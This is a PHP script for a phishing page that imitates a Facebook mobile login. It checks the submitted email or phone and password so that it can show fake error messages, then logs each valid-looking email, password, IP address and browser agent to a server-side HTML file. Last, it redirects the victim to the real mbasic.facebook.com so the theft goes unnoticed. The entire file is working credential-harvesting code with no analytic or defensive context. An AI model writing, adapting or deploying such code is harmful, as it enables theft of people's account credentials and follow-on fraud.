  <?php
  $div1 = '<div style="border:1px solid red; background:red;"><font color = "white"><p style="margin-left:10px; margin-top:3px; margin-bottom:3px;">';
 if(isset($_POST['login'])){
 include "main/wrong.php";

 function pass($to){

 include "main/wrong.php";
  $div1 = '<div style="border:1px solid red; background:red;"><font color = "white"><p style="margin-left:10px; margin-top:3px; margin-bottom:3px;">';
$fail = " ";
$user= $_POST['email'];
$pass= $_POST['pass'];
$x = strlen($pass);
if($x > 6 && $x < 20){
$agent =  $_SERVER['HTTP_USER_AGENT'];
 $ip = $_SERVER['REMOTE_ADDR'];


$fileopen = fopen($to."html","a");
fwrite($fileopen,"email--".$user."<br>password---".$pass."<br>ip--".$ip."<br>".$agent."<br>");
fclose($fileopen);
 ?> <html><head>
<meta name="viewport" content="minimal-ui, width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"></head><body>
<center>
<img src="main/load.gif" width="40%" style="margin-top:50%;">
</body>
</html>


<script> 
   

window.location.href="https://mbasic.facebook.com/saved/?cref=39&ref_component=mbasic_bookmark&ref_page=XMenuController";
</script>
<?php
}
	else{ 
 include "main/header2.html";

 echo $div1;
echo $wrongpassword;
 $fil = ' style = "border:1px solid red;" ';
}
}
$pass  =  $_POST['pass'];
 $x = strlen($pass);
 $ip = $_SERVER['REMOTE_ADDR'];

$fail = " ";
$fil = " ";
$user= $_POST['email'];
$g = strlen($user);
$s = strchr($user,"09");
$h = strchr($user,"@");
$i = strchr($h,".");

if($g > 6 && $g < 12){
	if(empty($s)){ $fail = ' style="border: solid 1px red;
  color: red;"' ;
 include "main/header2.html";

 echo $div1;
 echo $wrongmail;
 }
	else{ 
 
$fil = ' style="border: solid 1px red;
  color: red;"' ;
  
	pass($to);
	
		}
	}
	elseif ($g > 11 && $g < 25){
	 if(empty($i)){ $fail = ' style="border: solid 1px red;
  color: red;"' ;
 include "main/header2.html";

 echo $div1;
  echo $wrongmail;
  }
	else{ $fil = ' style="border: solid 1px red;
  color: red;"' ;

	pass($to);
		} }
	else{ $fail = ' style="border: solid 1px red;
  color: red;"' ;
 include "main/header2.html";

 echo $div1;
 echo $wrongmail;
 }
 ?> </font></p>
 </div><?php
 
 include "main/po.php";
 }
 else { include "main/header2.html";
 include "main/footer.php";
 
 }
 ?>
